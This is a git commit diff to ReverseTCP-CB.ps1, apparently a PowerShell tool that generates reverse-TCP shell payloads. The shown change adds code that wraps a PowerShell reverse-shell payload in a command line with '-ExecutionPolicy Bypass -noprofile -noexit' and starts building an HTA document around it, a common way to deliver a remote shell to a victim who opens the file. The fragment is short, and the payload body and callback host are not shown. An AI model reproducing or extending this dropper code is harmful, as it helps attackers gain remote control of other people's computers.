87a0c04afda85b8ca755c91f7b2f0273acd2fa79
Colby Burkett <burkettc@gmail.com>
2020-05-14 16:07:33 -0700

    Update ReverseTCP-CB.ps1

--- ReverseTCP-CB.ps1
+++ ReverseTCP-CB.ps1
@@ -211,6 +211,8 @@ If($Choice -eq "3")
 
 $PowerShell_Payload = $Payload[0];
 $CMD_Payload = $Payload[1];
+
+# HTA Document creation - Colby Burkett
 $HTA_Payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c " + $PowerShell_Payload
 $HTA = @"
     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
